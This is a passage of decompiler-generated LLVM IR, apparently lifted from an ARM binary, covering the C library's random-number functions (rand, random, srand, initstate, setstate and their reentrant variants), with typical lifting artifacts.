  uselistorder label %dec_label_pc_16af8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_16a7c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_16ba8 = call i32 @random()
  ret i32 %v0_16ba8

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 2, 1, 0, 12, 11, 10, 5, 4, 3, 8, 7, 6, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16bac = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_28b30.1012 to i32), i32* @r4, align 4
  %v2_16bb4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_16bb4, i32* @r0, align 4
  %v1_16bcc = call i32 @__pthread_return_void()
  %v1_16bdc = call i32 @__pthread_return_0()
  %v2_16be0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_16be8 = call i32 @__GI_random_r(i32* inttoptr (i32 166728 to i32*), i32 %v2_16be0)
  store i32 %v2_16bb4, i32* @r0, align 4
  store i32 93184, i32* @lr, align 4
  %v1_16bfc = call i32 @__pthread_return_void()
  %v3_16c00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_16bac, i32* @r4, align 4
  ret i32 %v3_16c00
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_16c2c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_16c2c, i32* @r0, align 4
  %v1_16c48 = call i32 @__pthread_return_void()
  %v1_16c58 = call i32 @__pthread_return_0()
  %v3_16c68 = load i32, i32* bitcast (i32** @global_var_28b50.1025 to i32*), align 4
  store i32 %v3_16c68, i32* @r4, align 4
  %v3_16c6c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_28b48)
  %v1_16c74 = icmp slt i32 %v3_16c6c, 0
  store i32 %v2_16c2c, i32* @r0, align 4
  %. = select i1 %v1_16c74, i32 0, i32 ptrtoint (i32** @global_var_28b4c.1027 to i32)
  %v1_16c8c = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_16cbc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_16cbc, i32* @r0, align 4
  %v1_16ce0 = call i32 @__pthread_return_void()
  %v1_16cf0 = call i32 @__pthread_return_0()
  %v0_16cf8 = load i32, i32* @r5, align 4
  %v0_16cfc = load i32, i32* @r6, align 4
  %v0_16d00 = load i32, i32* @r8, align 4
  store i32 %v0_16d00, i32* @r0, align 4
  %v3_16d04 = load i32, i32* bitcast (i32** @global_var_28b50.1025 to i32*), align 4
  store i32 %v3_16d04, i32* @r4, align 4
  %v4_16d08 = inttoptr i32 %v0_16d00 to i32*
  %v5_16d08 = call i32 @__GI_initstate_r(i32* %v4_16d08, i32 %v0_16cf8, i32 %v0_16cfc, i32 ptrtoint (i32* @global_var_28b48 to i32))
  store i32 %v2_16cbc, i32* @r0, align 4
  %v1_16d1c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_28b4c.1027 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_16d4c = load i32, i32* @r4, align 4
  %v9_16d4c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_28b30.1012 to i32), i32* @r4, align 4
  %v2_16d54 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_16d54, i32* @r0, align 4
  %v1_16d70 = call i32 @__pthread_return_void()
  %v1_16d80 = call i32 @__pthread_return_0()
  %v0_16d84 = load i32, i32* @r6, align 4
  store i32 %v0_16d84, i32* @r0, align 4
  %v2_16d8c = inttoptr i32 %v0_16d84 to i32*
  %v3_16d8c = call i32 @srandom_r(i32* %v2_16d8c, i32 ptrtoint (i32* @global_var_28b48 to i32))
  store i32 %v2_16d54, i32* @r0, align 4
  %v1_16da4 = call i32 @__pthread_return_void()
  store i32 %v3_16d4c, i32* @r4, align 4
  store i32 %v9_16d4c, i32* @r6, align 4
  ret i32 %v1_16da4

; uselistorder directives
  uselistorder i32* @global_var_28b48, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_28b48 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_16dc8 = add i32 %tmp, 12
  %v2_16dc8 = inttoptr i32 %v1_16dc8 to i32*
  %v3_16dc8 = load i32, i32* %v2_16dc8, align 4
  %v3_16dcc = load i32, i32* @r4, align 4
  store i32 %v3_16dcc, i32* %stack_var_-20, align 4
  %v2_16dd0 = icmp eq i32 %v3_16dc8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_16dd0, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_16ddc1 = add i32 %tmp, 8
  %v2_16ddc2 = inttoptr i32 %v1_16ddc1 to i32*
  %v3_16ddc3 = load i32, i32* %v2_16ddc2, align 4
  store i32 %v3_16ddc3, i32* %r1.global-to-local, align 4
  %v3_16df0 = add i32 %v3_16ddc3, -4
  %v4_16df0 = inttoptr i32 %v3_16df0 to i32*
  store i32 0, i32* %v4_16df0, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_16dd8 = add i32 %tmp, 4
  %v3_16dd8 = inttoptr i32 %v2_16dd8 to i32*
  %v4_16dd8 = load i32, i32* %v3_16dd8, align 4
  %v1_16ddc = add i32 %tmp, 8
  %v2_16ddc = inttoptr i32 %v1_16ddc to i32*
  %v3_16ddc = load i32, i32* %v2_16ddc, align 4
  store i32 %v3_16ddc, i32* %r1.global-to-local, align 4
  %v3_16de0 = sub i32 %v4_16dd8, %v3_16ddc
  %v4_16de4 = sdiv i32 %v3_16de0, 4
  %v4_16dec = mul i32 %v4_16de4, 5
  %v5_16dec = add i32 %v4_16dec, %v3_16dc8
  %v3_16df4 = add i32 %v3_16ddc, -4
  %v4_16df4 = inttoptr i32 %v3_16df4 to i32*
  store i32 %v5_16dec, i32* %v4_16df4, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_16df8 = add i32 %arg1, 4
  store i32 %v1_16df8, i32* %r6.global-to-local, align 4
  %v2_16dfc = inttoptr i32 %arg1 to i32*
  %v3_16dfc = load i32, i32* %v2_16dfc, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_16e04 = srem i32 %v3_16dfc, 5
  store i32 %v2_16e04, i32* %r0.global-to-local, align 4
  %v2_16e10 = and i32 %v2_16e04, 1073741824
  %v3_16e10 = icmp ne i32 %v2_16e10, 0
  %v4_16e10 = mul nsw i32 %v2_16e04, 4
  %v2_16e14 = icmp ne i32 %v2_16e04, 4
  %v3_16e14 = and i1 %v3_16e10, %v2_16e14
  br i1 %v3_16e14, label %dec_label_pc_16e70, label %dec_label_pc_16e18

dec_label_pc_16e18:                               ; preds = %bb
  %v5_16e10 = add i32 %v4_16e10, ptrtoint (i32* @global_var_202d8.1041 to i32)
  %v1_16e18 = add i32 %v4_16e10, add (i32 ptrtoint (i32* @global_var_202d8.1041 to i32), i32 20)
  %v2_16e18 = inttoptr i32 %v1_16e18 to i32*
  %v3_16e18 = load i32, i32* %v2_16e18, align 4
  store i32 %v3_16e18, i32* %r5.global-to-local, align 4
  %v6_16e1c = inttoptr i32 %v5_16e10 to i32*
  %v7_16e1c = load i32, i32* %v6_16e1c, align 4
  store i32 %v7_16e1c, i32* %r7.global-to-local, align 4
  %v2_16e20 = icmp eq i32 %v2_16e04, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_16e28 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e28 = add i32 %v1_16e28, 16
  %v3_16e28 = inttoptr i32 %v2_16e28 to i32*
  store i32 %v3_16e18, i32* %v3_16e28, align 4
  %v0_16e2c = load i32, i32* %r7.global-to-local, align 4
  %v1_16e2c = load i32, i32* %r4.global-to-local, align 4
  %v2_16e2c = add i32 %v1_16e2c, 20
  %v3_16e2c = inttoptr i32 %v2_16e2c to i32*
  store i32 %v0_16e2c, i32* %v3_16e2c, align 4
  %v0_16e30 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e30 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e30 = add i32 %v1_16e30, 12
  %v3_16e30 = inttoptr i32 %v2_16e30 to i32*
  store i32 %v0_16e30, i32* %v3_16e30, align 4
  br i1 %v2_16e20, label %dec_label_pc_16e5c, label %dec_label_pc_16e38

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e18
  %v0_16e38 = load i32, i32* %r6.global-to-local, align 4
  %v1_16e38 = add i32 %v0_16e38, -4
  %v2_16e38 = inttoptr i32 %v1_16e38 to i32*
  %v3_16e38 = load i32, i32* %v2_16e38, align 4
  %v1_16e3c = load i32, i32* %r1.global-to-local, align 4
  %v2_16e3c = sdiv i32 %v3_16e38, %v1_16e3c
  store i32 %v2_16e3c, i32* %r0.global-to-local, align 4
  %v4_16e40 = mul i32 %v2_16e3c, 4
  %v5_16e40 = add i32 %v4_16e40, %v0_16e38
  %v1_16e44 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e44 = add i32 %v1_16e44, 4
  %v3_16e44 = inttoptr i32 %v2_16e44 to i32*
  store i32 %v5_16e40, i32* %v3_16e44, align 4
  %v0_16e48 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e48 = load i32, i32* %r7.global-to-local, align 4
  %v2_16e48 = add i32 %v1_16e48, %v0_16e48
  %v0_16e4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16e4c, i32* %r1.global-to-local, align 4
  %v2_16e50 = srem i32 %v2_16e48, %v0_16e4c
  %v0_16e54 = load i32, i32* %r6.global-to-local, align 4
  %v4_16e54 = mul i32 %v2_16e50, 4
  %v5_16e54 = add i32 %v0_16e54, %v4_16e54
  store i32 %v5_16e54, i32* %r0.global-to-local, align 4
  %v1_16e58 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e58 = inttoptr i32 %v1_16e58 to i32*
  store i32 %v5_16e54, i32* %v2_16e58, align 4
  br label %dec_label_pc_16e5c

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e18, %dec_label_pc_16e38
  %v0_16e5c = load i32, i32* %r6.global-to-local, align 4
  %v1_16e5c = load i32, i32* %r5.global-to-local, align 4
  %v4_16e5c = mul i32 %v1_16e5c, 4
  %v5_16e5c = add i32 %v4_16e5c, %v0_16e5c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16e64 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e64 = add i32 %v1_16e64, 24
  %v3_16e64 = inttoptr i32 %v2_16e64 to i32*
  store i32 %v5_16e5c, i32* %v3_16e64, align 4
  %v0_16e68 = load i32, i32* %r6.global-to-local, align 4
  %v1_16e68 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e68 = add i32 %v1_16e68, 8
  %v3_16e68 = inttoptr i32 %v2_16e68 to i32*
  store i32 %v0_16e68, i32* %v3_16e68, align 4
  %v2_16e6c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e6c, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_16e70:                               ; preds = %bb
  %v0_16e70 = call i32 @__errno_location()
  %v2_16e78 = inttoptr i32 %v0_16e70 to i32*
  store i32 22, i32* %v2_16e78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16e80 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e80, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_16e04, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16e5c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_16e88 = add i32 %tmp, 12
  %v2_16e88 = inttoptr i32 %v1_16e88 to i32*
  %v3_16e88 = load i32, i32* %v2_16e88, align 4
  store i32 %v3_16e88, i32* %r3.global-to-local, align 4
  %v2_16e8c = icmp eq i32 %v3_16e88, 0
  %v3_16e90 = load i32, i32* @r4, align 4
  store i32 %v3_16e90, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_16e9c = add i32 %tmp, 8
  %v2_16e9c = inttoptr i32 %v1_16e9c to i32*
  %v3_16e9c = load i32, i32* %v2_16e9c, align 4
  store i32 %v3_16e9c, i32* %lr.global-to-local, align 4
  br i1 %v2_16e8c, label %dec_label_pc_16ea4, label %dec_label_pc_16ec8

dec_label_pc_16ea4:                               ; preds = %entry
  %v1_16ea4 = inttoptr i32 %v3_16e9c to i32*
  %v2_16ea4 = load i32, i32* %v1_16ea4, align 4
  store i32 %v2_16ea4, i32* %r2.global-to-local, align 4
  %v2_16eac = mul i32 %v2_16ea4, 1103515245
  %v1_16eb4 = add i32 %v2_16eac, 12345
  %tmp10 = bitcast i32 %v1_16eb4 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_16eb8 = bitcast float %tmp11 to i32
  store i32 %v1_16eb8, i32* %r3.global-to-local, align 4
  store i32 %v1_16eb8, i32* %v1_16ea4, align 4
  %v0_16ec0 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ec0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_16ec0, i32* %v2_16ec0, align 4
  br label %dec_label_pc_16f0c

dec_label_pc_16ec8:                               ; preds = %entry
  %v2_16ec8 = load i32, i32* %arg1, align 4
  store i32 %v2_16ec8, i32* %r2.global-to-local, align 4
  %v1_16ecc = add i32 %tmp, 4
  %v2_16ecc = inttoptr i32 %v1_16ecc to i32*
  %v3_16ecc = load i32, i32* %v2_16ecc, align 4
  store i32 %v3_16ecc, i32* %r0.global-to-local, align 4
  %v1_16ed0 = inttoptr i32 %v2_16ec8 to i32*
  %v2_16ed0 = load i32, i32* %v1_16ed0, align 4
  store i32 %v2_16ed0, i32* %r3.global-to-local, align 4
  %v1_16ed4 = inttoptr i32 %v3_16ecc to i32*
  %v2_16ed4 = load i32, i32* %v1_16ed4, align 4
  %v4_16ed4 = add i32 %v3_16ecc, 4
  store i32 %v4_16ed4, i32* %r0.global-to-local, align 4
  %v2_16ed8 = add i32 %v2_16ed4, %v2_16ed0
  store i32 %v2_16ed8, i32* %r3.global-to-local, align 4
  store i32 %v2_16ed8, i32* %v1_16ed0, align 4
  %v3_16edc = load i32, i32* %r2.global-to-local, align 4
  %v4_16edc = add i32 %v3_16edc, 4
  store i32 %v4_16edc, i32* %r2.global-to-local, align 4
  %v0_16ee0 = load i32, i32* %ip.global-to-local, align 4
  %v1_16ee0 = add i32 %v0_16ee0, 24
  %v2_16ee0 = inttoptr i32 %v1_16ee0 to i32*
  %v3_16ee0 = load i32, i32* %v2_16ee0, align 4
  store i32 %v3_16ee0, i32* %r4.global-to-local, align 4
  %v0_16ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_16ee4 = udiv i32 %v0_16ee4, 2
  store i32 %v3_16ee4, i32* %r3.global-to-local, align 4
  %v3_16ee8 = icmp ult i32 %v4_16edc, %v3_16ee0
  %v1_16eec = load i32, i32* %r5.global-to-local, align 4
  %v2_16eec = inttoptr i32 %v1_16eec to i32*
  store i32 %v3_16ee4, i32* %v2_16eec, align 4
  br i1 %v3_16ee8, label %dec_label_pc_16efc, label %bb

bb:                                               ; preds = %dec_label_pc_16ec8
  %v1_16ef0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16ef0, i32* %r2.global-to-local, align 4
  %v0_16ef4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ef4, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_16efc:                               ; preds = %dec_label_pc_16ec8
  %v0_16ef41 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ef41, i32* %r3.global-to-local, align 4
  %v1_16efc = load i32, i32* %r4.global-to-local, align 4
  %v3_16efc = icmp ult i32 %v0_16ef41, %v1_16efc
  br i1 %v3_16efc, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_16efc
  store i32 %v0_16ef41, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_16efc
  %v1_16f04 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16f04, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_16f08 = load i32, i32* %ip.global-to-local, align 4
  %v1_16f08 = inttoptr i32 %v0_16f08 to i32*
  %v2_16f08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_16f08, i32* %v1_16f08, align 4
  %v3_16f08 = add i32 %v0_16f08, 4
  %v4_16f08 = inttoptr i32 %v3_16f08 to i32*
  %v5_16f08 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_16f08, i32* %v4_16f08, align 4
  br label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16ea4, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_16f10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_16ef41, { 1, 0, 2 }
  uselistorder i32 %v3_16ee4, { 1, 0 }
  uselistorder i32 %v1_16eb8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_16f0c, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16f18 = load i32, i32* @r4, align 4
  store i32 %v3_16f18, i32* %stack_var_-32, align 4
  %v6_16f18 = load i32, i32* @r5, align 4
  %v1_16f1c = add i32 %tmp, 12
  %v2_16f1c = inttoptr i32 %v1_16f1c to i32*
  %v3_16f1c = load i32, i32* %v2_16f1c, align 4
  %v2_16f24 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_16f1c, 4
  br i1 %tmp29, label %.dec_label_pc_16fd0_crit_edge, label %dec_label_pc_16f34

.dec_label_pc_16fd0_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16fd0

dec_label_pc_16f34:                               ; preds = %entry
  %v0_16f34 = load i32, i32* @r0, align 4
  %v2_16f34 = icmp eq i32 %v0_16f34, 0
  %v1_16f38 = add i32 %tmp, 8
  %v2_16f38 = inttoptr i32 %v1_16f38 to i32*
  %v3_16f38 = load i32, i32* %v2_16f38, align 4
  store i32 %v3_16f38, i32* %r7.global-to-local, align 4
  br i1 %v2_16f34, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_16f34
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16f34, %bb
  %v0_16f44 = phi i32 [ %v0_16f34, %dec_label_pc_16f34 ], [ 1, %bb ]
  %v2_16f40 = icmp eq i32 %v3_16f1c, 0
  %v2_16f44 = inttoptr i32 %v3_16f38 to i32*
  store i32 %v0_16f44, i32* %v2_16f44, align 4
  br i1 %v2_16f40, label %dec_label_pc_16fcc, label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %bb21
  %v1_16f4c = add i32 %tmp, 16
  %v2_16f4c = inttoptr i32 %v1_16f4c to i32*
  %v3_16f4c = load i32, i32* %v2_16f4c, align 4
  store i32 %v3_16f4c, i32* %sb.global-to-local, align 4
  %v0_16f50 = load i32, i32* @r0, align 4
  %v0_16f54 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16f54, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_16f9c23 = icmp sgt i32 %v3_16f4c, 1
  br i1 %v5_16f9c23, label %dec_label_pc_16f60, label %dec_label_pc_16fa0

dec_label_pc_16f60:                               ; preds = %dec_label_pc_16f4c, %dec_label_pc_16f60
  %v0_16f7025 = phi i32 [ %v0_16f90.pre, %dec_label_pc_16f60 ], [ %v0_16f50, %dec_label_pc_16f4c ]
  %v1_16f8824 = phi i32 [ %v5_16f88, %dec_label_pc_16f60 ], [ %v0_16f54, %dec_label_pc_16f4c ]
  %v2_16f60 = srem i32 %v0_16f7025, ptrtoint (i32* @global_var_1f31d.1045 to i32)
  %v2_16f6c = mul i32 %v2_16f60, 16807
  %v2_16f74 = sdiv i32 %v0_16f7025, ptrtoint (i32* @global_var_1f31d.1045 to i32)
  %tmp30 = mul i32 %v2_16f74, -2836
  %v2_16f80 = add i32 %v2_16f6c, %tmp30
  %v8_16f80 = icmp slt i32 %v2_16f80, 0
  %v2_16f84 = add i32 %v2_16f80, 2147483647
  %v2_16f84.v2_16f80 = select i1 %v8_16f80, i32 %v2_16f84, i32 %v2_16f80
  store i32 %v2_16f84.v2_16f80, i32* @r5, align 4
  %v2_16f88 = add i32 %v1_16f8824, 4
  %v3_16f88 = inttoptr i32 %v2_16f88 to i32*
  store i32 %v2_16f84.v2_16f80, i32* %v3_16f88, align 4
  %v4_16f88 = load i32, i32* %sl.global-to-local, align 4
  %v5_16f88 = add i32 %v4_16f88, 4
  store i32 %v5_16f88, i32* %sl.global-to-local, align 4
  %v0_16f8c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_16f8c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16f90.pre = load i32, i32* @r5, align 4
  %v1_16f98 = add i32 %v0_16f8c.pre, 1
  store i32 %v1_16f98, i32* %r8.global-to-local, align 4
  %v5_16f9c = icmp slt i32 %v0_16f8c.pre, %v1_16f8c.pre
  br i1 %v5_16f9c, label %dec_label_pc_16f60, label %dec_label_pc_16f8c.dec_label_pc_16fa0_crit_edge

dec_label_pc_16f8c.dec_label_pc_16fa0_crit_edge:  ; preds = %dec_label_pc_16f60
  %v0_16fac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16fa0

dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f8c.dec_label_pc_16fa0_crit_edge, %dec_label_pc_16f4c
  %v0_16fac = phi i32 [ %v0_16fac.pre, %dec_label_pc_16f8c.dec_label_pc_16fa0_crit_edge ], [ %v0_16f54, %dec_label_pc_16f4c ]
  %v0_16fa4.lcssa = phi i32 [ %v1_16f8c.pre, %dec_label_pc_16f8c.dec_label_pc_16fa0_crit_edge ], [ %v3_16f4c, %dec_label_pc_16f4c ]
  %v2_16fa4 = mul i32 %v0_16fa4.lcssa, 10
  store i32 %v2_16fa4, i32* @r4, align 4
  %v0_16fa8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16fa8 = add i32 %v0_16fa8, 20
  %v2_16fa8 = inttoptr i32 %v1_16fa8 to i32*
  %v3_16fa8 = load i32, i32* %v2_16fa8, align 4
  %v4_16fac = mul i32 %v3_16fa8, 4
  %v5_16fac = add i32 %v0_16fac, %v4_16fac
  %v1_16fb0 = inttoptr i32 %v0_16fa8 to i32*
  store i32 %v5_16fac, i32* %v1_16fb0, align 4
  %v3_16fb0 = add i32 %v0_16fa8, 4
  %v4_16fb0 = inttoptr i32 %v3_16fb0 to i32*
  %v5_16fb0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_16fb0, i32* %v4_16fb0, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_16fb8:                               ; preds = %dec_label_pc_16fbc
  %v0_16fc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_16fb8 = inttoptr i32 %v0_16fc0 to i32*
  %v3_16fb8 = call i32 @__GI_random_r(i32* %v2_16fb8, i32 %v2_16f24)
  br label %dec_label_pc_16fbc

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16fa0, %dec_label_pc_16fb8
  %v0_16fbc = load i32, i32* @r4, align 4
  %v1_16fbc = add i32 %v0_16fbc, -1
  store i32 %v1_16fbc, i32* @r4, align 4
  %v6_16fbc = icmp slt i32 %v1_16fbc, 0
  br i1 %v6_16fbc, label %dec_label_pc_16fcc, label %dec_label_pc_16fb8

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fbc, %bb21
  %v2_16fd4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_16fd0

dec_label_pc_16fd0:                               ; preds = %.dec_label_pc_16fd0_crit_edge, %dec_label_pc_16fcc
  %v2_16fd4 = phi i32 [ %v3_16f18, %.dec_label_pc_16fd0_crit_edge ], [ %v2_16fd4.pre, %dec_label_pc_16fcc ]
  %v26_16fd4 = phi i32 [ -1, %.dec_label_pc_16fd0_crit_edge ], [ 0, %dec_label_pc_16fcc ]
  store i32 %v2_16fd4, i32* @r4, align 4
  store i32 %v6_16f18, i32* @r5, align 4
  ret i32 %v26_16fd4

; uselistorder directives
  uselistorder i32 %v1_16fbc, { 1, 0 }
  uselistorder i32 %v0_16fa8, { 1, 0, 2 }
  uselistorder i32 %v0_16f8c.pre, { 1, 0 }
  uselistorder i32 %v5_16f88, { 1, 0 }
  uselistorder i32 %v2_16f80, { 2, 1, 0 }
  uselistorder i32 %v0_16f7025, { 1, 0 }
  uselistorder i32 %v0_16f54, { 1, 0, 2 }
  uselistorder i32 %v3_16f4c, { 1, 0, 2 }
  uselistorder i32 %v3_16f1c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1f31d.1045 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_16fd0, { 1, 0 }
  uselistorder label %dec_label_pc_16fbc, { 1, 0 }
  uselistorder label %dec_label_pc_16f60, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16fd8:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_16fd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16fd8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_16fd8
  %v2_16fd8 = load i32, i32* @r7, align 4
  %v5_16fd8 = udiv i32 %v2_16fd8, 8
  %v6_16fd8 = and i32 %v5_16fd8, %arg1
  store i32 %v6_16fd8, i32* %r4.global-to-local, align 4
  %v2_16fdc = load i32, i32* @sp, align 4
  %v8_16fdc = shl i32 %v2_16fdc, %arg3
  %v9_16fdc = and i32 %v8_16fdc, %arg2
  call void @__pseudo_branch(i32 %v9_16fdc)
  %v0_16fe0.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_16fe0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_16fe0.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_16fe0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16fe0 = load i32, i32* @fp, align 4
  %v8_16fe0 = shl i32 %v2_16fe0, %v3_16fe0
  %v9_16fe0 = and i32 %v8_16fe0, %v1_16fe0
  store i32 %v9_16fe0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_16fd8, %bb
  %v10_16fe0 = phi i32 [ %arg1, %dec_label_pc_16fd8 ], [ %v9_16fe0, %bb ], [ %v1_16fe0, %.thread ]
  ret i32 %v10_16fe0

; uselistorder directives
  uselistorder i32 %v1_16fe0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
